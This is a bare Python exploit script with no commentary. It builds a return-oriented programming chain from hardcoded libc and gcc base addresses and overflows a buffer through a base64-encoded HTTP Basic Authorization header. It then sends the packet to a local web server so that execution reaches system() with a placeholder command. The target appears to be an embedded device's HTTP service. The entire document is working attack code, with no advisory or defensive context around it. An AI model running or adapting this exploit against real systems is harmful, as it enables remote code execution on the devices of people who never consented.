import socket
import struct
import base64

libc = 0x2aaef000
gcc = 0x2ab72000

rop1 = struct.pack('>L', gcc + 0x8B20)
rop2 = struct.pack('>L', libc + 0x20650)
rop3 = struct.pack('>L', gcc + 0x17A4)
rop4 = struct.pack('>L', gcc + 0xABD0)
system = struct.pack('>L', libc + 0x2ac90)

command = b'ABCD' * 50

s0 = rop3
s1 = b'BBBB'
s2 = b'CCCC'
s3 = system
s4 = rop2
stack_ra = rop4
ra = rop1

overflow = b'a:%s' % (b'A' * (0x3C - 2)) + stack_ra + s0 + s1 + s2 + s3 + s4 + ra + command

packet = b'GET / HTTP/1.1\r\n'
packet += b'Host: 127.0.0.1:80\r\n'
packet += b'Authorization: Basic %s\r\n' % base64.b64encode(overflow)
packet += b'User-Agent: Real UserAgent\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 80))
s.send(packet)
print(s.recv(2048))
s.close()
